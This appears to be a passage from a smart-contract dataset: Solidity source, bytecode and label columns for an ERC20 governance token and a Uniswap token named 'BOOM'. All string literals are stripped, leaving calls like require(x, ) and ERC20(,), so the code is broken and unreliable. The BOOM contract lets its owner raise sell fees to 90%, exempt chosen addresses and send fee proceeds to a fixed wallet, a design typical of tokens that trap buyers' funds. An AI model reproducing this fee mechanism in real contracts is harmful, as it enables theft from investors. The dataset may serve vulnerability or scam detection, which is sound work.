_initialSupply); _addMinter(msg.sender); DOMAIN_SEPARATOR = keccak256( abi.encode( DOMAIN_TYPE_HASH, DOMAIN_NAME_HASH, DOMAIN_VERSION_HASH, _getChainID(), address(this), DOMAIN_SALT ) ); } function permit( address _owner, address _spender, uint256 _value, uint256 _deadline, uint8 _v, bytes32 _r, bytes32 _s ) external { bytes32 digest = keccak256( abi.encodePacked( , DOMAIN_SEPARATOR, keccak256( abi.encode( PERMIT_TYPEHASH, _owner, _spender, _value, nonces[_owner], _deadline ) ) ) ); nonces[_owner] = nonces[_owner].add(1); address recoveredAddress = ECDSA.recover(digest, abi.encodePacked(_r, _s, _v)); require(_owner == recoveredAddress, ); require(_deadline == 0 || block.timestamp <= _deadline, ); _approve(_owner, _spender, _value); } function addMinter(address _account) external onlyGovernor { _addMinter(_account); } function removeMinter(address _account) external onlyGovernor { _removeMinter(_account); } function renounceMinter() external { _removeMinter(msg.sender); } function mint(address _to, uint256 _amount) external onlyMinter { _mint(_to, _amount); } function isMinter(address _account) public view returns (bool) { return _minters[_account]; } function _addMinter(address _account) private { _minters[_account] = true; emit MinterAdded(_account); } function _removeMinter(address _account) private { _minters[_account] = false; emit MinterRemoved(_account); } function _getChainID() private pure returns (uint256) { uint256 id; assembly { id := chainid() } return id; }}",0x608060405234801561001057600080fd5b50600436106101585760003560e01c806379cc6790116100c3578063a9059cbb1161007c578063a9059cbb1461042b578063aa271e1a14610457578063d505accf1461047d578063dd62ed3e146104ce578063e3056a34146104fc578063f2fde38b1461050457610158565b806379cc6790146103775780637ecebe00146103a357806395d89b41146103c9578063983b2d56146103d157806398650275146103f7578063a457c2d7146103ff57610158565b8063313ce56711610115578063313ce567146102b657806339509351146102d457806340c10f191461030057806342966c681461032c57806370a082311461034957806379ba50971461036f57610158565b806306fdde031461015d578063095ea7b3146101da5780630c340a241461021a57806318160ddd1461023e57806323b872dd146102585780633092afd51461028e575b600080fd5b61016561052a565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561019f578181015183820152602001610187565b50505050905090810190601f1680156101cc5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610206600480360360408110156101f057600080fd5b506001600160a01b0381351690602001356105c0565b604080519115158252519081900360200190f35b6102226105dd565b604080516001600160a01b039092168252519081900360200190f35b6102466105ec565b60408051918252519081900360200190f35b6102066004803603606081101561026e57600080fd5b506001600160a01b038135811691602081013590911690604001356105f2565b6102b4600480360360208110156102a457600080fd5b50356001600160a01b0316610679565b005b6102be6106dd565b6040805160ff9092168252519081900360200190f35b610206600480360360408110156102ea57600080fd5b506001600160a01b0381351690602001356106e6565b6102b46004803603604081101561031657600080fd5b506001600160a01b038135169060200135610734565b6102b46004803603602081101561034257600080fd5b5035610793565b6102466004803603602081101561035f57600080fd5b50356001600160a01b03166107a4565b6102b46107bf565b6102b46004803603604081101561038d57600080fd5b506001600160a01b0381351690602001356108ce565b610246600480360360208110156103b957600080fd5b50356001600160a01b0316610928565b61016561093a565b6102b4600480360360208110156103e757600080fd5b50356001600160a01b031661099b565b6102b46109fc565b6102066004803603604081101561041557600080fd5b506001600160a01b038135169060200135610a07565b6102066004803603604081101561044157600080fd5b506001600160a01b038135169060200135610a6f565b6102066004803603602081101561046d57600080fd5b50356001600160a01b0316610a83565b6102b4600480360360e081101561049357600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135610aa1565b610246600480360360408110156104e457600080fd5b506001600160a01b0381358116916020013516610c95565b610222610cc0565b6102b46004803603602081101561051a57600080fd5b50356001600160a01b0316610ccf565b60058054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156105b65780601f1061058b576101008083540402835291602001916105b6565b820191906000526020600020905b81548152906001019060200180831161059957829003601f168201915b5050505050905090565b60006105d46105cd610e50565b8484610e54565b50600192915050565b6000546001600160a01b031681565b60045490565b60006105ff848484610f40565b61066f8461060b610e50565b61066a856040518060600160405280602881526020016116b2602891396001600160a01b038a16600090815260036020526040812090610649610e50565b6001600160a01b03168152602081019190915260400160002054919061109d565b610e54565b5060019392505050565b6000546001600160a01b031633146106d1576040805162461bcd60e51b815260206004820152601660248201527513db9b1e4811dbdd995c9b9bdc8818d85b8818d85b1b60521b604482015290519081900360640190fd5b6106da81611134565b50565b60075460ff1690565b60006105d46106f3610e50565b8461066a8560036000610704610e50565b6001600160a01b03908116825260208083019390935260409182016000908120918c168152925290205490610def565b61073d33610a83565b610785576040805162461bcd60e51b815260206004820152601460248201527313db9b1e481b5a5b9d195c8818d85b8818d85b1b60621b604482015290519081900360640190fd5b61078f828261117d565b5050565b6106da61079e610e50565b8261126f565b6001600160a01b031660009081526002602052604090205490565b6001546001600160a01b0316158015906107e357506001546001600160a01b031633145b610834576040805162461bcd60e51b815260206004820152601f60248201527f43616c6c6572206d7573742062652070656e64696e6720676f7665726e6f7200604482015290519081900360640190fd5b60008054600180546001600160a01b038082166001600160a01b03198086168217808855931690935560405193811694929391169184917f0ac6deed30eef60090c749850e10f2fa469e3e25fec1d1bef2853003f6e6f18f9190a36001546040516001600160a01b03918216918316907f76563ad561b7036ae716b9b25cb521b21463240f104c97e12f25877f2235f33d90600090a35050565b6000610905826040518060600160405280602481526020016116da602491396108fe866108f9610e50565b610c95565b919061109d565b905061091983610913610e50565b83610e54565b610923838361126f565b505050565b600a6020526000908152604090205481565b60068054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156105b65780601f1061058b576101008083540402835291602001916105b6565b6000546001600160a01b031633146109f3576040805162461bcd60e51b815260206004820152601660248201527513db9b1e4811dbdd995c9b9bdc8818d85b8818d85b1b60521b604482015290519081900360640190fd5b6106da8161136b565b610a0533611134565b565b60006105d4610a14610e50565b8461066a856040518060600160405280602581526020016117686025913960036000610a3e610e50565b6001600160a01b03908116825260208083019390935260409182016000908120918d1681529252902054919061109d565b60006105d4610a7c610e50565b8484610f40565b6001600160a01b031660009081526009602052604090205460ff1690565b6008546001600160a01b038089166000818152600a602081815260408084205481517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981850152808301879052968e166060880152608087018d905260a0870181905260c08088018d90528251808903909101815260e08801835280519084012061190160f01b6101008901526101028801989098526101228088019890985281518088039098018852610142909601905285519581019590952092909152909252610b6e906001610def565b6001600160a01b0389166000908152600a602090815260408083209390935582519081018690528083018590526001600160f81b031960f888901b16606082015282516041818303018152606190910190925290610bcd9083906113b7565b9050806001600160a01b0316896001600160a01b031614610c2b576040805162461bcd60e51b815260206004820152601360248201527211d4950e881a5b9d985b1a59081c195c9b5a5d606a1b604482015290519081900360640190fd5b851580610c385750854211155b610c7f576040805162461bcd60e51b815260206004820152601360248201527211d4950e88195e1c1a5c9959081c195c9b5a5d606a1b604482015290519081900360640190fd5b610c8a898989610e54565b505050505050505050565b6001600160a01b03918216600090815260036020908152604080832093909416825291909152205490565b6001546001600160a01b031681565b6000546001600160a01b03163314610d27576040805162461bcd60e51b815260206004820152601660248201527513db9b1e4811dbdd995c9b9bdc8818d85b8818d85b1b60521b604482015290519081900360640190fd5b6001600160a01b038116610d79576040805162461bcd60e51b815260206004820152601460248201527311dbdd995c9b9bdc881b5d5cdd081899481cd95d60621b604482015290519081900360640190fd5b600180546001600160a01b038381166001600160a01b03198316179283905560405191811692169082907f76563ad561b7036ae716b9b25cb521b21463240f104c97e12f25877f2235f33d90600090a35050565b600080546001600160a01b0319166001600160a01b0392909216919091179055565b600082820183811015610e49576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b3390565b6001600160a01b038316610e995760405162461bcd60e51b81526004018080602001828103825260248152602001806117446024913960400191505060405180910390fd5b6001600160a01b038216610ede5760405162461bcd60e51b81526004018080602001828103825260228152602001806116266022913960400191505060405180910390fd5b6001600160a01b03808416600081815260036020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316610f855760405162461bcd60e51b815260040180806020018281038252602581526020018061171f6025913960400191505060405180910390fd5b6001600160a01b038216610fca5760405162461bcd60e51b81526004018080602001828103825260238152602001806115e16023913960400191505060405180910390fd5b610fd5838383610923565b61101281604051806060016040528060268152602001611648602691396001600160a01b038616600090815260026020526040902054919061109d565b6001600160a01b0380851660009081526002602052604080822093909355908416815220546110419082610def565b6001600160a01b0380841660008181526002602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b6000818484111561112c5760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b838110156110f15781810151838201526020016110d9565b50505050905090810190601f16801561111e5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b6001600160a01b038116600081815260096020526040808220805460ff19169055517fe94479a9f7e1952cc78f2d6baab678adc1b772d936c6583def489e524cb666929190a250565b6001600160a01b0382166111d8576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6111e460008383610923565b6004546111f19082610def565b6004556001600160a01b0382166000908152600260205260409020546112179082610def565b6001600160a01b03831660008181526002602090815260408083209490945583518581529351929391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b6001600160a01b0382166112b45760405162461bcd60e51b81526004018080602001828103825260218152602001806116fe6021913960400191505060405180910390fd5b6112c082600083610923565b6112fd81604051806060016040528060228152602001611604602291396001600160a01b038516600090815260026020526040902054919061109d565b6001600160a01b038316600090815260026020526040902055600454611323908261159e565b6004556040805182815290516000916001600160a01b038516917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a35050565b6001600160a01b038116600081815260096020526040808220805460ff19166001179055517f6ae172837ea30b801fbfcdd4108aa1d5bf8ff775444fd70256b44e6bf3dfc3f69190a250565b6000815160411461140f576040805162461bcd60e51b815260206004820152601f60248201527f45434453413a20696e76616c6964207369676e6174757265206c656e67746800604482015290519081900360640190fd5b60208201516040830151606084015160001a7f7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a08211156114805760405162461bcd60e51b815260040180806020018281038252602281526020018061166e6022913960400191505060405180910390fd5b8060ff16601b148061149557508060ff16601c145b6114d05760405162461bcd60e51b81526004018080602001828103825260228152602001806116906022913960400191505060405180910390fd5b600060018783868660405160008152602001604052604051808581526020018460ff1681526020018381526020018281526020019450505050506020604051602081039080840390855afa15801561152c573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116611594576040805162461bcd60e51b815260206004820152601860248201527f45434453413a20696e76616c6964207369676e61747572650000000000000000604482015290519081900360640190fd5b9695505050505050565b6000610e4983836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061109d56fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a206275726e20616d6f756e7420657863656564732062616c616e636545524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545434453413a20696e76616c6964207369676e6174757265202773272076616c756545434453413a20696e76616c6964207369676e6174757265202776272076616c756545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e20616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e2066726f6d20746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122028978c229b51c3a9489101e8096301e85866fa63b6ccbd95d247e376d1f5407664736f6c63430007040033,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity 0.8.17; abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { this; return msg.data; }} interface IUniswapV2Pair { event Approval(address indexed owner, address indexed spender, uint value); event Transfer(address indexed from, address indexed to, uint value); function name() external pure returns (string memory); function symbol() external pure returns (string memory); function decimals() external pure returns (uint8); function totalSupply() external view returns (uint); function balanceOf(address owner) external view returns (uint); function allowance(address owner, address spender) external view returns (uint); function approve(address spender, uint value) external returns (bool); function transfer(address to, uint value) external returns (bool); function transferFrom(address from, address to, uint value) external returns (bool); function DOMAIN_SEPARATOR() external view returns (bytes32); function PERMIT_TYPEHASH() external pure returns (bytes32); function nonces(address owner) external view returns (uint); function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external; event Mint(address indexed sender, uint amount0, uint amount1); event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to ); event Sync(uint112 reserve0, uint112 reserve1); function MINIMUM_LIQUIDITY() external pure returns (uint); function factory() external view returns (address); function token0() external view returns (address); function token1() external view returns (address); function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast); function price0CumulativeLast() external view returns (uint); function price1CumulativeLast() external view returns (uint); function kLast() external view returns (uint); function mint(address to) external returns (uint liquidity); function burn(address to) external returns (uint amount0, uint amount1); function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; function skim(address to) external; function sync() external; function initialize(address, address) external;} interface IUniswapV2Factory { event PairCreated(address indexed token0, address indexed token1, address pair, uint); function feeTo() external view returns (address); function feeToSetter() external view returns (address); function getPair(address tokenA, address tokenB) external view returns (address pair); function allPairs(uint) external view returns (address pair); function allPairsLength() external view returns (uint); function createPair(address tokenA, address tokenB) external returns (address pair); function setFeeTo(address) external; function setFeeToSetter(address) external;} interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);} interface IERC20Metadata is IERC20 { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);} contract ERC20 is Context, IERC20, IERC20Metadata { using SafeMath for uint256; mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; constructor(string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; } function name() public view virtual override returns (string memory) { return _name; } function symbol() public view virtual override returns (string memory) { return _symbol; } function decimals() public view virtual override returns (uint8) { return 18; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer( address sender, address recipient, uint256 amount ) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve( address owner, address spender, uint256 amount ) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual {}} library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }} contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }} library SafeMathInt { int256 private constant MIN_INT256 = int256(1) << 255; int256 private constant MAX_INT256 = ~(int256(1) << 255); function mul(int256 a, int256 b) internal pure returns (int256) { int256 c = a * b; require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256)); require((b == 0) || (c / b == a)); return c; } function div(int256 a, int256 b) internal pure returns (int256) { require(b != -1 || a != MIN_INT256); return a / b; } function sub(int256 a, int256 b) internal pure returns (int256) { int256 c = a - b; require((b >= 0 && c <= a) || (b < 0 && c > a)); return c; } function add(int256 a, int256 b) internal pure returns (int256) { int256 c = a + b; require((b >= 0 && c >= a) || (b < 0 && c < a)); return c; } function abs(int256 a) internal pure returns (int256) { require(a != MIN_INT256); return a < 0 ? -a : a; } function toUint256Safe(int256 a) internal pure returns (uint256) { require(a >= 0); return uint256(a); }} library SafeMathUint { function toInt256Safe(uint256 a) internal pure returns (int256) { int256 b = int256(a); require(b >= 0); return b; }} interface IUniswapV2Router01 { function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity); function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB); function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH); function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB); function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH); function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts); function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts); function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts); function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts); function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts); function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts); function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB); function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut); function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn); function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts); function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);} interface IUniswapV2Router02 is IUniswapV2Router01 { function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH); function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH); function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable; function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;} contract BOOM is ERC20, Ownable { using SafeMath for uint256; IUniswapV2Router02 public immutable uniswapV2Router; address public immutable uniswapV2Pair; bool private swapping; address private marketingWallet; address private devWallet; uint256 public maxTransactionAmount; uint256 public swapTokensAtAmount; uint256 public maxWallet; bool public limitsInEffect = true; bool public tradingActive = true; bool public swapEnabled = true; uint256 public buyTotalFees; uint256 public buyMarketingFee; uint256 public buyLiquidityFee; uint256 public buyDevFee; uint256 public sellTotalFees; uint256 public sellMarketingFee; uint256 public sellLiquidityFee; uint256 public sellDevFee; uint256 public tokensForMarketing; uint256 public tokensForLiquidity; uint256 public tokensForDev; uint256 launchedAt; mapping (address => bool) private _isExcludedFromFees; mapping (address => bool) public _isExcludedMaxTransactionAmount; mapping (address => bool) public partners; event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress); event ExcludeFromFees(address indexed account, bool isExcluded); event Setpartner(address indexed pair, bool indexed value); event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet); event devWalletUpdated(address indexed newWallet, address indexed oldWallet); event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity ); event AutoNukeLP(); event ManualNukeLP(); constructor() ERC20(,) { IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); excludeFromMaxTransaction(address(_uniswapV2Router), true); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH()); excludeFromMaxTransaction(address(uniswapV2Pair), true); _setpartner(address(uniswapV2Pair), true); uint256 _buyMarketingFee = 10; uint256 _buyLiquidityFee = 5; uint256 _buyDevFee = 0; uint256 _sellMarketingFee = 25; uint256 _sellLiquidityFee = 5; uint256 _sellDevFee = 0; uint256 totalSupply = 1 * 1e9 * 1e18; maxTransactionAmount = totalSupply * 15 / 1000; maxWallet = totalSupply * 15 / 1000; swapTokensAtAmount = totalSupply * 5 / 10000; buyMarketingFee = _buyMarketingFee; buyLiquidityFee = _buyLiquidityFee; buyDevFee = _buyDevFee; buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee; sellMarketingFee = _sellMarketingFee; sellLiquidityFee = _sellLiquidityFee; sellDevFee = _sellDevFee; sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee; marketingWallet = 0xe149349996ce5444335e7Df4348feAE25269fdE1; devWallet = 0xe149349996ce5444335e7Df4348feAE25269fdE1; excludeFromFees(owner(), true); excludeFromFees(address(this), true); excludeFromFees(address(0xdead), true); excludeFromMaxTransaction(owner(), true); excludeFromMaxTransaction(address(this), true); excludeFromMaxTransaction(address(0xdead), true); _mint(msg.sender, totalSupply); } receive() external payable { } function enableTrading() external onlyOwner { tradingActive = true; swapEnabled = true; launchedAt = block.number; } function removeLimits() external onlyOwner returns (bool){ limitsInEffect = false; return true; } function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){ require(newAmount >= totalSupply() * 1 / 100000, ); require(newAmount <= totalSupply() * 5 / 1000, ); swapTokensAtAmount = newAmount; return true; } function updateMaxTxnAmount(uint256 newNum) external onlyOwner { require(newNum >= (totalSupply() * 1 / 1000)/1e18, ); maxTransactionAmount = newNum * (10**18); } function updateMaxWalletAmount(uint256 newNum) external onlyOwner { require(newNum >= (totalSupply() * 5 / 1000)/1e18, ); maxWallet = newNum * (10**18); } function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner { _isExcludedMaxTransactionAmount[updAds] = isEx; } function updateBuyFees( uint256 _devFee, uint256 _liquidityFee, uint256 _marketingFee ) external onlyOwner { buyDevFee = _devFee; buyLiquidityFee = _liquidityFee; buyMarketingFee = _marketingFee; buyTotalFees = buyDevFee + buyLiquidityFee + buyMarketingFee; require(buyTotalFees <= 10, ); } function updateSellFees( uint256 _devFee, uint256 _liquidityFee, uint256 _marketingFee ) external onlyOwner { sellDevFee = _devFee; sellLiquidityFee = _liquidityFee; sellMarketingFee = _marketingFee; sellTotalFees = sellDevFee + sellLiquidityFee + sellMarketingFee; require(sellTotalFees <= 90, ); } function updateSwapEnabled(bool enabled) external onlyOwner(){ swapEnabled = enabled; } function excludeFromFees(address account, bool excluded) public onlyOwner { _isExcludedFromFees[account] = excluded; emit ExcludeFromFees(account, excluded); } function setpartner(address pair, bool value) public onlyOwner { require(pair != uniswapV2Pair, ); _setpartner(pair, value); } function _setpartner(address pair, bool value) private { partners[pair] = value; emit Setpartner(pair, value); } function updateMarketingWallet(address newMarketingWallet) external onlyOwner { emit marketingWalletUpdated(newMarketingWallet, marketingWallet); marketingWallet = newMarketingWallet; } function updateDevWallet(address newWallet) external onlyOwner { emit devWalletUpdated(newWallet, devWallet); devWallet = newWallet; } function isExcludedFromFees(address account) public view returns(bool) { return _isExcludedFromFees[account]; } function _transfer( address from, address to, uint256 amount ) internal override { require(from != address(0), ); require(to != address(0), ); if(amount == 0) { super._transfer(from, to, 0); return; } if(limitsInEffect){ if ( from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping ){ if(!tradingActive){ require(_isExcludedFromFees[from] || _isExcludedFromFees[to], ); } if (partners[from] && !_isExcludedMaxTransactionAmount[to]) { require(amount <= maxTransactionAmount, ); require(amount + balanceOf(to) <= maxWallet, ); } else if (partners[to] && !_isExcludedMaxTransactionAmount[from]) { require(amount <= maxTransactionAmount, ); } else if(!_isExcludedMaxTransactionAmount[to]){ require(amount + balanceOf(to) <= maxWallet, ); } } } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= swapTokensAtAmount; if( canSwap && swapEnabled && !swapping && !partners[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] ) { swapping = true; swapBack(); swapping = false; } bool takeFee = !swapping; if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) { takeFee = false; } uint256 fees = 0; if(takeFee){ if (partners[to] && sellTotalFees > 0){ fees = amount.mul(sellTotalFees).div(100); tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees; tokensForDev += fees * sellDevFee / sellTotalFees; tokensForMarketing += fees * sellMarketingFee / sellTotalFees; } else if(partners[from] && buyTotalFees > 0) { fees = amount.mul(buyTotalFees).div(100); tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees; tokensForDev += fees * buyDevFee / buyTotalFees; tokensForMarketing += fees * buyMarketingFee / buyTotalFees; } if(fees > 0){ super._transfer(from, address(this), fees); } amount -= fees; } super._transfer(from, to, amount); } function swapTokensForEth(uint256 tokenAmount) private { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.addLiquidityETH{value: ethAmount}( address(this), tokenAmount, 0, 0, address(this), block.timestamp ); } function swapBack() private { uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev; bool success; if(contractBalance == 0 || totalTokensToSwap == 0) {return;} if(contractBalance > swapTokensAtAmount * 20){ contractBalance = swapTokensAtAmount * 20; } uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2; uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens); uint256 initialETHBalance = address(this).balance; swapTokensForEth(amountToSwapForETH); uint256 ethBalance = address(this).balance.sub(initialETHBalance); uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap); uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap); uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev; tokensForLiquidity = 0; tokensForMarketing = 0; tokensForDev = 0; (success,) = address(devWallet).call{value: ethForDev}(); if(liquidityTokens > 0 && ethForLiquidity > 0){ addLiquidity(liquidityTokens, 